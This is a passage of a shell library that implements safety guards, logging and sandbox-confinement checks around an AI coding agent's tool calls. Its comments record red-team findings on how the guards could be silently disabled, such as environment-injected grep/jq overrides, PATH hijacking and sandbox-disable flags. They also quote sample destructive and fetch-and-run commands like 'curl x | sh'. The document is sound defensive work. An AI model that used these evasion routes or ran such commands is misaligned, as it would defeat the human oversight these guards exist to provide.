#    CAVEAT, deliberately recorded: access(2) short-circuits for uid 0, so this
#    gate does NOT hold for a session running as root. The floor is not designed
#    to be run as root and B1 is the backstop there.
#    If the mode drifts we go BLIND, never slow — records drop, verdict untouched.
#
# 3. IT CREATES NOTHING. No mkdir, no `>`, no rotation, no size check. A hot path
#    that creates files is a hot path that can be aimed; and `[ -d ] || mkdir -p`
#    FORKS on every call once the dir is uncreatable, making the broken case an
#    order of magnitude slower than the healthy one. It is also what makes
#    floor-test.sh structurally unable to reach the operator's live tree: the
#    suite sets CLAUDE_CONFIG_DIR but never $HOME, and a writer that cannot
#    create cannot pollute what it cannot find. That is not hypothetical — a
#    design-phase prototype whose writer COULD mkdir wrote 1002 records into the
#    live ~/.claude/MEMORY tree during this ticket's own design.
#
# 4. NO PAYLOAD-DERIVED BYTES REACH THE BUILDER. Every field is a call-site
#    literal, a closed enum mapped through a `case` with NO pass-through arm,
#    fixed-width hex, or a clock reading. There is no escaping path because there
#    is nothing escapable — POSIX sh has no JSON.stringify, and a redaction that
#    depends on escaping is one edit away from being wrong. Note what is absent:
#    the floor_block MESSAGE. guard-egress.sh:420 interpolates a redirect target
#    lifted out of the command, and guard-selfedit.sh:73 interpolates the
#    payload's resolved file_path (CONSTITUTION №3).
#
# 5. ONE RECORD = ONE printf = ONE write(). Two guards append to one file for a
#    single Bash call (floor-install.sh:88-89) and tool calls run in parallel, so
#    interleaving is the normal case, not the edge case. Measured on this box:
#    concurrent `printf >> file` under /bin/sh is atomic up to EXACTLY 1024 bytes
#    including the newline and tears reliably above it (8 writers x 300 records:
#    0 torn at 1023, 1278 torn at 1024). That bound is stdio's buffer, NOT
#    PIPE_BUF — PIPE_BUF governs pipes, not regular files, and quoting it here
#    would be a plausible wrong reason for a right number. Records measure
#    ~110 bytes; the cap is asserted at 512 to keep half the real margin spare.
#
# NOT SETTABLE FROM THE ENVIRONMENT, deliberately: an overridable sink path or a
# HELM_OBS_DISABLE switch would be an undocumented SECOND kill switch for the
# block ledger, settable from a project settings.json `env` block — the exact
# class already refused for FLOOR_GREP, FLOOR_AWK and FLOOR_INSTR_SURFACES.
#
# EVERY GUARD THAT LOGS MUST BE NAMED HERE, and the enum is why: an unlisted token
# is coerced to `other`, silently. guard-cloud and guard-destroy shipped
# (harbor#201/#194) without this line being extended, so 745 of their decisions
# filed as g=other — invisible to the tool census, whose whole purpose is to catch
# a dead dispatch arm by a class that never appears. A guard added to the floor
# without a token added here is a guard the ledger cannot see.
#
# IT THEN HAPPENED AGAIN, TO THE GUARD THAT SHIPPED NEXT, and the second time is
# what makes this a mechanism problem rather than an oversight. `deliverables` was
# passed by guard-deliverables.sh from the day it landed and was never added here,
# so its entire output filed as `other`. Measured on this box 2026-09-05: all
# 1,805 `other` records are that one guard -- 1,780 deliverables-clean, 20
# home-loose, 5 dropzone -- and NOT ONE was written by an unrecognised guard. The
# bucket whose whole job is to make an unknown writer visible was 100% a known
# one, so the census could not have caught the thing it exists to catch.
#
# So the paragraph above was true, was written down, and still did not hold,
# because a rule with no mechanism is a wish. LINT C7 IS THE MECHANISM: it reads
# this line against every literal `floor_log_decision <token>` call site in bin/
# and hooks/ and fails when the two disagree in EITHER direction -- an unlisted
# writer (this defect) and a listed token nobody writes (the dead dispatch arm the
# census is for). Extending this line is now a change the linter demands, not one
# the next author has to remember.
FLOOR_OBS_GUARDS=' bash egress selfedit integrity web wrapper session cloud destroy deliverables prod inject govern apiroute '
# `ask` is a REAL verdict, not a near-miss. It was missing here for the same reason
# the guard tokens were: the enum predates the two ASK-gate guards. 548 ask records
# had already been coerced to `other` when this was found — and the ask tier is
# exactly the one that auto-approves in an unattended session (guard-cloud.sh:104),
# so "how often was the soft tier hit" was the one question the ledger most needed
# to answer and structurally could not.
FLOOR_OBS_VERDICTS=' block allow deny ask gate advise override armed shadow covered '
FLOOR_OBS_SHAPES=' argv flat path channel content meta '
FLOOR_OBS_TOOLS=' Bash Write Edit MultiEdit NotebookEdit WebFetch WebSearch Task Agent ToolSearch mcp none other '

floor_log_decision() { # <guard> <verdict> <rule.shape>
  # Charset gate BEFORE enum membership, always. The membership test expands the
  # candidate inside double quotes so its metacharacters are already literal,
  # but the gate keeps that true independently of one pair of quotes surviving a
  # future edit.
  _og="${1:-}"
  case "$_og" in ''|*[!abcdefghijklmnopqrstuvwxyz0-9-]*) _og=other ;; esac
  case "$FLOOR_OBS_GUARDS" in *" $_og "*) ;; *) _og=other ;; esac

  _ov="${2:-}"
  case "$_ov" in ''|*[!abcdefghijklmnopqrstuvwxyz-]*) _ov=other ;; esac
  case "$FLOOR_OBS_VERDICTS" in *" $_ov "*) ;; *) _ov=other ;; esac
  # A call that shadow-recorded (or covered, harbor#1300) a would-be block is not also a clean pass (harbor#482).
  case "$_ov:${FLOOR_SHADOWED:-}" in allow:1) return 0 ;; esac

  # <rule>.<shape> split by parameter expansion — two builtins, no forks. The
  # DOTTED form (not a `flat-`/`argv-` prefix) keeps the rule token shared across
  # a flat/argv twin, so "top rules" groups them as one rule while the DE-01 axis
  # stays queryable on `s`.
  _ors="${3:-}"
  _or="${_ors%.*}"; _osh="${_ors##*.}"
  case "$_or" in ''|*[!abcdefghijklmnopqrstuvwxyz0-9-]*) _or=unclassified ;; esac
  [ "${#_or}" -le 40 ] || _or=unclassified
  case "$_osh" in ''|*[!abcdefghijklmnopqrstuvwxyz]*) _osh=meta ;; esac
  case "$FLOOR_OBS_SHAPES" in *" $_osh "*) ;; *) _osh=meta ;; esac

  # tool_name is ATTACKER-SHAPED for the mcp__* family (a repo-supplied .mcp.json
  # names them), so it is MAPPED to a constant, never passed through.
  _ot="${FLOOR_TOOL:-}"
  case "$_ot" in '') _ot=none ;; *[!A-Za-z0-9_]*) _ot=other ;; esac
  case "$FLOOR_OBS_TOOLS" in
    *" $_ot "*) ;;
    *) case "$_ot" in mcp__*) _ot=mcp ;; *) _ot=other ;; esac ;;
  esac

  # THE SINK FOLLOWS THE WRITER, NOT THE CALLER. This read
  # `${CLAUDE_CONFIG_DIR:-$HOME/.claude}` — the CALLER's environment — and that is
  # how a guard executed out of a repo checkout filed its fixtures next to the
  # operator's real decisions. Measured 2026-08-25 on this box: 1,723 cloud/destroy
  # records in one day written by suite copies, and every crit-eligible
  # `wrapper-no-jq` record traced to ONE line in an unmerged branch's
  # destroy-guard-test.sh, which fires `env -i PATH=... HOME="$HOME"`.
  #
  # THAT `env -i` IS WHY PER-SUITE ISOLATION CANNOT BE THE FIX. It strips
  # CLAUDE_CONFIG_DIR by construction and re-passes HOME deliberately, so the
  # sink resolved to the live tree no matter what the suite set. A convention
  # cannot survive a caller whose whole purpose is a clean environment — and the
  # same fix by convention was already tried and lost: lint F4 hand-lists four
  # suites, and the two that escaped were not among them.
  #
  # `$0` IS THE GUARD, NOT THIS FILE. guard-lib.sh is SOURCED (`. "$DIR/guard-lib.sh"`
  # in every guard), and POSIX sh does not rebind $0 inside a function, so $0 is the
  # sourcing script: <cfg>/bin/<guard>.sh for all 22 wired hook commands, every one
  # of them an absolute path (verified against the live hook table). Two strips give
  # the config root — byte-identical to the old answer in production, and a checkout
  # with no MEMORY/OBSERVABILITY tree everywhere else. The writer CREATES NOTHING
  # (property 3), so "everywhere else" means blind rather than misfiled.
  #
  # floor_config_dir() IS DELIBERATELY UNTOUCHED, and the distinction is the whole
  # design: a guard must keep resolving surface rules against the config dir the
  # SESSION uses — it protects the directory it is governing, not the directory it
  # was copied from. Only the sink follows the writer.
  #
  # The trailing-slash strip is kept from the previous spelling: without it CFG_RE
  # gained a `//+` and every surface rule silently stopped firing (red-team pass 8).
  # A relative spelling is still refused outright — `sh guard-bash.sh` from inside
  # bin/ leaves no slash to strip, so the case below drops the record. Blind, never
  # wrong.
  _ocfg="${0%/*}"; _ocfg="${_ocfg%/*}"
  while [ "${_ocfg%/}" != "$_ocfg" ] && [ "$_ocfg" != "/" ]; do _ocfg="${_ocfg%/}"; done
  case "$_ocfg" in /*) ;; *) return 0 ;; esac

  # Host token via the `read` BUILTIN — zero forks, for a value that changes once
  # per boot. TYPE-CHECKED FIRST: `read` from a FIFO blocks exactly like `>>`
  # does, so the token file gets the same treatment as the sink. Absent or
  # hostile => a partition that does not exist => the gate below refuses =>
  # blind, never wrong.
  _oh=unknown-host
  _oht="$_ocfg/.helm-obs-host"
  if [ -f "$_oht" ] && [ ! -L "$_oht" ]; then
    _ohr=""
    { IFS= read -r _ohr < "$_oht"; } 2>/dev/null || :
    case "$_ohr" in ''|*[!A-Za-z0-9_-]*) ;; *) _oh="$_ohr" ;; esac
  fi

  # THE TWO GATES. Order matters: the directory gate is what keeps the file
  # gate's answer true one instruction later. See property 2 above.
  _odir="$_ocfg/MEMORY/OBSERVABILITY/$_oh"
  [ ! -w "$_odir" ] || return 0
  _osink="$_odir/guard-decisions.jsonl"
  { [ -f "$_osink" ] && [ ! -L "$_osink" ]; } || return 0

  # The clock's fork (the session key below adds one hash, ~2 ms; harbor#309). There is no POSIX builtin clock: EPOCHSECONDS and
  # EPOCHREALTIME are unset under /bin/sh (bash 3.2.57), $SECONDS reads 0 in a
  # fresh hook process, and /usr/bin/awk has no systime(). A malformed clock
  # ABORTS the record rather than writing an unparseable field — one dropped
  # record beats a ledger that jq refuses.
  _ots="$(date -u '+%Y-%m-%dT%H:%M:%SZ' 2>/dev/null)" || _ots=""
  case "$_ots" in
    [0-9][0-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9]T[0-9][0-9]:[0-9][0-9]:[0-9][0-9]Z) ;;
    *) return 0 ;;
  esac

  # DECISION PATHS ONLY — block, deny, ask. Never allow.
  #
  # The original rule was `block` alone, and its reasoning still holds for the
  # allow path verbatim: on an allow there is no consumer, the rules are
  # deterministic on the command so a command that allows once allows always, and
  # it would put a fork plus a command oracle on the overwhelming majority of the
  # file. That majority is real — allow is 12,863 of 21,303 records measured.
  #
  # BUT `block` ALONE MADE THE FIELD UNREACHABLE FOR TWO WHOLE GUARDS.
  # guard-cloud and guard-destroy never emit `block` — their entire output is
  # permissionDecision verdicts — so `h` was "-" on 7,873 of 7,873 of their
  # records, and "which command triggered this deny" was unanswerable for the
  # tier that gates dataset deletion and device wipes (harbor#350).
  #
  # The cost objection does not transfer to this tier, and that is measured
  # rather than assumed: deny+ask is 8,450 records, of which 8,429 are
  # cloud+destroy and ~97% of those are burst-shaped test fixtures that
  # harbor#343 stops at the source. Excluding them, deny+ask across the whole
  # ledger's life is 21 records. A fork on that is not a fork on the hot path.
  #
  # `advise` and `armed` are deliberately NOT here: neither gates anything, so
  # neither has the consumer that justifies the fork.
  _odg=-
  case "$_ov" in block|deny|ask|shadow|covered)
    { _odg="$(floor_obs_digest "$_ocfg")"; } 2>/dev/null || _odg=-
    case "$_odg" in
      [0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef]) ;;
      *) _odg=- ;;
    esac ;;
  esac

  # THE SESSION KEY, `sk` (harbor#309): which session wrote the record, so a block can be joined to
  # what that session did next. Salted like `h` under a `sid:` prefix, never the raw id. Read by
  # expansion, not jq: no fork for the read, one hash (on allow records too, which carry no `h`).
  # ANCHORED to the payload's first key, as the harness sends it (fixtures/pretooluse-bash.real.json):
  # a reordered payload gives `-` rather than an MCP tool's `session_id` argument, and nothing past
  # the prefix is scanned. Any doubt gives `-`; the verdict never depends on it.
  _osid=""
  case "${FLOOR_IN:-}" in '{"session_id":"'*)
    _osid=${FLOOR_IN#'{"session_id":"'}; _osid=${_osid%%'"'*} ;;
  esac
  case "$_osid" in ''|*[!A-Za-z0-9_-]*) _osid="" ;; esac
  [ "${#_osid}" -le 64 ] || _osid=""
  _osk=-
  if [ -n "$_osid" ]; then
    { _osk="$(floor_obs_digest "$_ocfg" "sid:$_osid")"; } 2>/dev/null || _osk=-
    case "$_osk" in
      [0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef][0-9abcdef]) ;;
      *) _osk=- ;;
    esac
  fi

  # THE CONFINEMENT FIELD, `c` (harbor#1298, #555): a closed enum, never a payload byte. `off` while no confinement is
  # installed (no marker beside managed settings: deploy-confinement.sh writes it), `unconfined` when the call asked for
  # the unsandboxed retry, `confined` otherwise, `-` for a tool the confinement does not wrap. `-f` and a case match
  # only: no fork on the hot path. Read by observe-report.sh --confinement for #555 decision 10 (a), the escape rate.
  _oc=-
  if [ "$_ot" = Bash ]; then
    _oc=off
    if [ -n "${HARBOR_MANAGED_SETTINGS:-}" ]; then [ ! -f "${HARBOR_MANAGED_SETTINGS%/*}/harbor-confinement" ] || _oc=confined
    elif [ -f '/Library/Application Support/ClaudeCode/harbor-confinement' ] || [ -f /etc/claude-code/harbor-confinement ]; then _oc=confined
    fi
    if [ "$_oc" = confined ]; then
      case "${FLOOR_IN:-}" in *'"dangerouslyDisableSandbox":true'*|*'"dangerouslyDisableSandbox": true'*) _oc=unconfined ;; esac
    fi
  fi

  { printf '{"v":1,"ts":"%s","g":"%s","d":"%s","r":"%s","s":"%s","t":"%s","h":"%s","sk":"%s","c":"%s"}\n' \
      "$_ots" "$_og" "$_ov" "$_or" "$_osh" "$_ot" "$_odg" "$_osk" "$_oc" >> "$_osink"; } 2>/dev/null || :
  return 0
}

# floor_obs_digest <cfg-dir> — 16 hex of sha256(salt ":" subject[0:512]), or "-".
#
# THE SUBJECT IS $FLOOR_OBS_SUBJECT, set by each guard right after it extracts
# its payload — NOT a fourth argument to floor_block. Passing payload text into
# floor_block would leave it one careless edit away from the stderr printf. Not
# $FLOOR_IN either: the raw payload carries session_id and cwd, so the same
# command would hash differently in two sessions and recurrence counting — the
# only thing the digest is for — would be dead on arrival.
#
# SALTED, not merely truncated. An unsalted truncated sha256 of a low-entropy
# shell command is a CONFIRMATION ORACLE, not a redaction: floor_block's stderr
# TELLS the operator which commands were blocked, so known plaintext is
# guaranteed, and at 48 bits a match against a candidate is effectively proof.
# Shortening it to blunt that destroys the recurrence counting it exists for.
# There is no truncation length that is both safe and useful; a per-install
# secret is the only operating point that answers "is this the same command
# again?" without answering "what was the command?".
#
# THE HASHER IS PINNED TO ABSOLUTE PATHS, exactly as FLOOR_GREP is pinned above
# and for the identical reason. floor_sha (below) resolves sha256sum/shasum by
# BARE NAME through PATH; that is harmless because it runs only at SessionStart,
# but a bare-name resolution on the block path is a per-tool-call CODE EXECUTION
# primitive for anyone who can set PATH via a project settings.json `env` block —
# and their fake sha256sum would receive, as its stdin, the very command text
# this design promised never to write down. floor_sha is therefore NOT reused.
# /usr/bin/shasum is LAST because it is a Perl script and an order of magnitude
# slower than sha256sum — a cliff entered silently on a box lacking the first.
floor_obs_digest() { # <cfg-dir> [subject]
  # harbor#309: an explicit subject (the session key's) replaces the guard's, one hasher for both.
  _dsub="${2-${FLOOR_OBS_SUBJECT:-}}"
  [ -n "$_dsub" ] || { printf '%s' -; return 0; }
  _dsf="$1/.helm-obs-salt"
  { [ -f "$_dsf" ] && [ ! -L "$_dsf" ]; } || { printf '%s' -; return 0; }
  # `|| :` and NOT `|| _dsalt=""` — `read` returns 1 on a file with no trailing
  # newline while still assigning.
  _dsalt=""
  { IFS= read -r _dsalt < "$_dsf"; } 2>/dev/null || :
  case "$_dsalt" in ''|*[!0-9abcdef]*) printf '%s' -; return 0 ;; esac
  [ "${#_dsalt}" -eq 32 ] || { printf '%s' -; return 0; }
  # Two printfs into one pipe, never a "$SALT:$CMD" concatenation: materialising
  # a 60,000-char concatenation is the part that is not flat.
  _dh=""
  for _dc in /sbin/sha256sum /usr/bin/sha256sum /bin/sha256sum \
             /usr/local/bin/sha256sum /opt/homebrew/bin/sha256sum; do
    if [ -x "$_dc" ]; then
      { _dh="$({ printf '%s:' "$_dsalt"; printf '%.512s' "$_dsub"; } | "$_dc")"; } 2>/dev/null || _dh=""
      break
    fi
  done
  if [ -z "$_dh" ]; then
    for _dc in /usr/bin/shasum /bin/shasum; do
      if [ -x "$_dc" ]; then
        { _dh="$({ printf '%s:' "$_dsalt"; printf '%.512s' "$_dsub"; } | "$_dc" -a 256)"; } 2>/dev/null || _dh=""
        break
      fi
    done
  fi
  _dh="${_dh%% *}"                       # both spellings print "<hex>  -"
  case "$_dh" in *[!0-9abcdef]*|'') printf '%s' -; return 0 ;; esac
  [ "${#_dh}" -ge 16 ] || { printf '%s' -; return 0; }
  # First 16 chars by parameter expansion, not `cut` — a second PATH-resolved
  # binary on the block path.
  _dt="${_dh#????????????????}"
  printf '%s' "${_dh%"$_dt"}"
  return 0
}

# floor_block <guard> <message> [rule.shape] — deny the tool call: reason to
# stderr (fed back to the model), one record, exit 2. The one blocking exit in
# the floor.
# THE RECORD IS WRITTEN AFTER BOTH printfs, never before: a logger fault must not
# be able to swallow the reason the operator needs in order to argue with the
# rule. And the rule id is shown to the operator, because "this rule is wrong" is
# the feedback this ticket exists to collect and they cannot name a rule the
# floor never told them about.
#
# THE REMEDY PRINTED IS THE NARROWEST TRUE ONE (harbor#482). It used to be the
# kill-switch for every rule, which turns all of them off to get past one. A `!`
# command is not a tool call, so no guard sees it: one command, once, by the
# operator. A file-tool refusal names the edit instead, made by the operator by
# hand. Lint F16 keeps the blanket hatch out of every guard but the two where it
# is the true remedy.
#
# SHADOW (harbor#482): under HELM_FLOOR_SHADOW=1, set by the operator at launch
# like the kill-switch, a rule records `shadow` and RETURNS instead of exiting,
# so the guard keeps evaluating: every would-be block is recorded, and a later
# rule that stays enforcing (floor_shadow_enforces) is still reached and still
# blocks. Returning 0 keeps `hit … && floor_block …` lists alive under set -e.
floor_block() {
  # COVERED (harbor#1300): the confinement denies this target, so the OS decides; recorded, and the guard keeps
  # evaluating exactly as under shadow, so a later rule that is not covered still blocks.
  if floor_confinement_covers "$1" "${3%.*}"; then
    printf 'HELM FLOOR [%s:%s]: COVERED — the confinement denies this target, so the sandbox decides\n' "$1" "${3%.*}" >&2
    floor_log_decision "$1" covered "${3:-}" || :
    FLOOR_SHADOWED=1
    return 0
  fi
  if [ "${HELM_FLOOR_SHADOW:-0}" = 1 ] && ! floor_shadow_enforces "$1" "${3%.*}"; then
    printf 'HELM FLOOR [%s:%s]: SHADOW — would have blocked; recorded, not enforced\n' "$1" "${3%.*}" >&2
    floor_log_decision "$1" shadow "${3:-}" || :
    FLOOR_SHADOWED=1
    return 0
  fi
  if [ -n "${3:-}" ]; then
    printf 'HELM FLOOR [%s:%s]: BLOCKED — %s\n' "$1" "${3%.*}" "$2" >&2
  else
    printf 'HELM FLOOR [%s]: BLOCKED — %s\n' "$1" "$2" >&2
  fi
  # A file-tool refusal has no command to hand to `!`: its narrow remedy is the edit itself.
  case "${FLOOR_TOOL:-}" in
    Write|Edit|MultiEdit|NotebookEdit)
      printf '(if this refusal is wrong: the operator can make this one edit themselves, in their own editor or terminal, which is not a tool call, so no guard sees it; the rule id above is what to report)\n' >&2 ;;
    *)
      printf '(if this refusal is wrong: the operator can run this one command as "! <command>" at the prompt, which is not a tool call, so no guard sees it; the rule id above is what to report)\n' >&2 ;;
  esac
  floor_log_decision "$1" block "${3:-}" || :
  exit 2
}

# Set only by floor_block in this process. Cleared at source time, so a value
# inherited from the environment cannot suppress this call's allow record.
FLOOR_SHADOWED=

# floor_shadow_enforces <guard> <rule> — 0 iff this rule keeps blocking in a
# shadow session. The set is what would let a shadow session make itself, or a
# later session, unguarded or unrecorded, or take an act reserved to a person:
#   selfedit         floor control surfaces and switch-bearing settings, file tools
#   *surface*, *-cfg*, cd-bridge-*
#                    the same surfaces and the config dir from a command: without
#                    these a shadow session could rewrite settings.json or replace
#                    the guards that are meant to keep enforcing (review of #970)
#   killswitch-*     setting or persisting either switch, from a command
#   startup-file-*   shell startup files, where a persisted switch would live
#   api-route-*      Claude Code's own API route in settings.json
#   finding-label-*  a finding disposition, which is the operator's act (#855)
# The surface family is matched by the rule ids' own naming, not listed one by one;
# floor.ledger-test SH-11 derives every guard-bash rule whose message names a floor
# surface or the config dir and fails if one falls outside these patterns.
# Everything else is measured, not enforced. guard-cloud and guard-destroy decide
# through permissionDecision and do not read shadow at all (FLOOR.md).
floor_shadow_enforces() { # <guard> <rule>
  case "$1" in selfedit) return 0 ;; esac
  case "$2" in
    *surface*|*-cfg|*-cfg-*|cd-bridge-*) return 0 ;;
    killswitch-*|startup-file-*|api-route-*|finding-label-*) return 0 ;;
  esac
  return 1
}

# floor_confinement_covers <guard> <rule> — 0 iff this block is skipped because the confinement already denies its
# target (harbor#1300, #555 P3): the rule is in the covered set, the call runs confined, the operator turned the skip
# on, and the config dir is outside everything the sandbox lets a command write. Any doubt is 1, and the rule blocks.
# The set mirrors CONTRACTS/confinement-coverage.tsv, and tests/floor/floor.confinement-test.sh holds the two equal:
# rules whose whole target is the config dir or a floor surface in it. Never a rule whose target can sit in the write
# zone or above the config dir, a remote action, or a file tool (the sandbox wraps Bash alone).
# NOTHING HERE IS READ FROM THE ENVIRONMENT. A project's settings `env` block reaches every hook, so the marker and the
# managed file are pinned literals (tests drive a copy with them rewritten, as HOST-1 does for scutil), the marker must
# be root-owned, and the skip is a line only the operator's sudo install writes (`confinement_skip` in harbor.toml):
# harbor.toml itself sits inside the write zone, so a confined session could turn a skip read from there on itself.
# Called on the block path only, so its forks never touch an allowed call.
_FLOOR_CONF_DIRS='/Library/Application Support/ClaudeCode:/etc/claude-code'
_FLOOR_CONF_UID=0
_FLOOR_CONF_TMP='/tmp:/private/tmp'   # the temp trees a sandboxed command may write
# _floor_conf_under <dir> <rows> -> 0 when <dir> sits under one of the newline-separated rows (`~` expanded, a glob
# cut at its first `*`, so a pattern reads as the widest tree it can match). A pipe and `exit`, not a substitution:
# bash 3.2 as sh misparses case patterns inside $(...).
_floor_conf_under() {
  # Seatbelt enforces resolved paths, so a link on either side is compared resolved as well as spelled (review, #1300).
  _fut="${1%/}/"; _fur="$(cd -P -- "$1" 2>/dev/null && pwd -P)"; _fur="${_fur:+${_fur%/}/}"
  printf '%s\n' "$2" | { while IFS= read -r _ful; do
    [ -n "$_ful" ] || continue
    case "$_ful" in ('~') _ful="$HOME" ;; ('~/'*) _ful="$HOME/${_ful#'~/'}" ;; esac
    _ful="${_ful%%\**}"; _ful="${_ful%/}"
    _flr="$(cd -P -- "${_ful:-/}" 2>/dev/null && pwd -P)"; _ful="$_ful/"; _flr="${_flr:+${_flr%/}/}"
    for _fux in "$_fut" "$_fur"; do
      [ -n "$_fux" ] || continue
      case "$_fux" in ("$_ful"*) exit 0 ;; esac
      [ -z "$_flr" ] || case "$_fux" in ("$_flr"*) exit 0 ;; esac
    done
  done; exit 1; }
}
# _floor_conf_widened <dir>... -> 0 when a settings file Claude Code reads beside the managed one could widen the
# sandbox past what this check reads: a `sandbox` key (excludedCommands, filesystem.disabled, allowWrite),
# additionalDirectories, or an Edit/Write allow rule. An unreadable file counts as widened.
_floor_conf_widened() {
  for _fwd in "$@"; do
    [ -n "$_fwd" ] || continue
    for _fwf in "$_fwd/settings.json" "$_fwd/settings.local.json"; do
      [ -e "$_fwf" ] || continue
      "$FLOOR_JQ" -e 'has("sandbox") or ((.permissions.additionalDirectories // []) | length > 0)
          or ((.permissions.allow // []) | any(startswith("Edit(") or startswith("Write(")))' "$_fwf" >/dev/null 2>&1
      [ "$?" -eq 1 ] || return 0
    done
  done
  return 1
}
floor_confinement_covers() { # <guard> <rule>
  [ "$1" = bash ] && [ "${FLOOR_TOOL:-}" = Bash ] || return 1
  case "$2" in
    cd-cfg-then-fetch|cd-cfg-then-extract|cd-cfg-then-find-exec|cd-cfg-then-mutate|cd-cfg-then-plutil|cd-cfg-then-redirect) ;;
    cd-bridge-copy|cd-bridge-destroy|cd-bridge-move|destructive-at-cfg|rsync-delete-cfg) ;;
    extract-into-cfg|extractor-writes-cfg|mutate-into-cfg|plutil-writes-cfg|redirect-into-cfg) ;;
    mutate-onto-surface|mutate-aimed-surface|redirect-floor-surface|inplace-floor-surface|outdir-onto-surface) ;;
    outflag-onto-surface|jq-rewrites-surface|dasel-at-surface|dd-at-surface|tar-archive-at-surface|git-write-at-surface) ;;
    *) return 1 ;;
  esac
  case "${FLOOR_IN:-}" in *dangerouslyDisableSandbox*) return 1 ;; esac
  # A surface includes workflow files anywhere; one outside $PORT_ROOT (a clone in the sandbox's tmp) is writable.
  # Case-insensitive like the rules themselves, and APFS folds case (review, #1300).
  ! floor_ematch "${FLOOR_OBS_SUBJECT:-}" 'github.*workflows' || return 1
  _fcm=""; _fcs=""; _fci="$_FLOOR_CONF_DIRS:"
  while [ -n "$_fci" ]; do
    _fcd="${_fci%%:*}"; _fci="${_fci#*:}"
    if [ -f "$_fcd/harbor-confinement" ]; then _fcm="$_fcd/harbor-confinement"; _fcs="$_fcd/managed-settings.json"; break; fi
  done
  [ -n "$_fcm" ] && [ ! -L "$_fcm" ] && [ ! -L "$_fcs" ] || return 1
  [ "$(ls -ln "$_fcm" 2>/dev/null | awk '{ print $3 }')" = "$_FLOOR_CONF_UID" ] || return 1
  [ "$(ls -ln "$_fcs" 2>/dev/null | awk '{ print $3 }')" = "$_FLOOR_CONF_UID" ] || return 1
  "$FLOOR_GREP" -qx 'skip=covered' "$_fcm" 2>/dev/null || return 1
  # Where a confined command may write: the managed allowWrite rows, the project dir and the cwd (the sandbox's own
  # defaults), and the temp trees. The config dir, and the live one when they differ, must sit under none of them.
  _fcw="$("$FLOOR_JQ" -r 'if .sandbox.enabled == true and .sandbox.failIfUnavailable == true
      then (.sandbox.filesystem.allowWrite // [])[] else error("off") end' "$_fcs" 2>/dev/null)" || return 1
  _fcw="$_fcw
${CLAUDE_PROJECT_DIR:-}
$PWD
$(floor_field '.cwd')
${TMPDIR:-}
$(printf '%s\n' "$_FLOOR_CONF_TMP" | tr ':' '\n')"
  for _fct in "$(floor_config_dir)" "${LIVE_DIR:-$HOME/.claude}"; do
    ! _floor_conf_under "$_fct" "$_fcw" || return 1
  done
  # User, local and project settings apply to the sandbox too, and none is locked by the managed tier.
  _fcp="$(floor_field '.cwd')"
  ! _floor_conf_widened "$(floor_config_dir)" "${LIVE_DIR:-$HOME/.claude}" "${CLAUDE_PROJECT_DIR:+$CLAUDE_PROJECT_DIR/.claude}" \
      "$PWD/.claude" "${_fcp:+$_fcp/.claude}" || return 1
  return 0
}

# floor_ematch <text> <ERE> — 0 iff text matches the case-insensitive ERE.
# Portable BSD+GNU: no \b/\s/\d (POSIX classes + explicit boundaries only), and
# NO mid-pattern `^` inside an alternation — BSD grep silently never matches
# that alternative, which quietly disabled several rules while they still
# matched under the GNU grep an interactive shell may resolve first. The
# interpreter is PINNED to the system grep for the same reason: the floor must
# behave identically no matter what is early in PATH.
# An INHERITED FLOOR_GREP/FLOOR_AWK is a second, undocumented kill-switch:
# FLOOR_GREP=/usr/bin/false makes every rule in every guard return false while
# the floor still looks installed, pinned and wired (red-team pass 8). The
# override is honoured only for a real system grep; anything else is ignored.
_fg="${FLOOR_GREP:-}"
# AND AN ALLOWLISTED PATH IS NOT AN EXECUTABLE ONE (review of harbor#341). The
# allowlist alone refuses /usr/bin/false but ACCEPTS an allowlisted path that is
# absent on this host — /opt/homebrew/bin/grep does not exist here — and the
# interpreter then fails to launch on every call: floor_ematch returns non-zero,
# every rule reads false, and the floor is off while still looking installed,
# pinned and wired. Same kill-switch, reached through a different door. `-x` is
# what closes it; without it the two-line allowlist is theatre.
case "$_fg" in
  /usr/bin/grep|/bin/grep|/usr/local/bin/grep|/opt/homebrew/bin/grep) [ -x "$_fg" ] || _fg="" ;;
  *) _fg="" ;;
esac
FLOOR_GREP="${_fg:-$( [ -x /usr/bin/grep ] && echo /usr/bin/grep || echo grep )}"
# jq GETS THE SAME TREATMENT, AND DID NOT (measured 2026-08-25). floor_field
# invoked a BARE `jq`, so it was PATH-only while grep had an absolute fallback
# two lines up. A hook firing with a stripped PATH therefore lost jq while
# /usr/bin/jq sat there executable — and this is the failure the comment on
# floor_field calls the most dangerous in the set, because every field reads
# empty and an UNWRAPPED guard then sees an empty command and allows anything.
# Two live wrapper denials at 2026-08-25T05:46:27Z, one tool call across both
# PreToolUse wirings, with jq present the whole time.
#
# THE ALLOWLIST IS NOT OPTIONAL, for the reason spelled out for FLOOR_GREP: an
# inherited FLOOR_JQ=/usr/bin/false would make every field read empty while the
# floor still looked installed, pinned and wired — the same undocumented
# kill-switch red-team pass 8 found, one interpreter to the left. The override is
# honoured only for a real system jq; anything else is ignored.
_fj="${FLOOR_JQ:-}"
case "$_fj" in
  /usr/bin/jq|/bin/jq|/usr/local/bin/jq|/opt/homebrew/bin/jq) [ -x "$_fj" ] || _fj="" ;;
  *) _fj="" ;;
esac
FLOOR_JQ="${_fj:-$( [ -x /usr/bin/jq ] && echo /usr/bin/jq || echo jq )}"
floor_ematch() { printf '%s' "$1" | "$FLOOR_GREP" -iEq -- "$2"; }

# ─────────────────────────────────────────────────────────────────────────────
# Anti-evasion pre-pass for Bash guards (B3/B4). The recon's load-bearing
# lesson (ported from safety-classifier.ts:213-356): a naive grep over the raw
# command both false-POSITIVES on inert single-quoted data (echo 'rm -rf /')
# and false-NEGATIVES on executed quoted args (env bash -c 'curl x | sh') and
# command substitutions. floor_bash_targets normalizes one command into the
# NEWLINE-joined set of strings that will actually run, and callers grep each
# pattern over that set.
# ─────────────────────────────────────────────────────────────────────────────

# floor_peel <cmd> — strip up to 3 layers of benign prefix wrappers
# (FOO=bar / sudo / env / nohup / command / exec / timeout N) so a wrapper
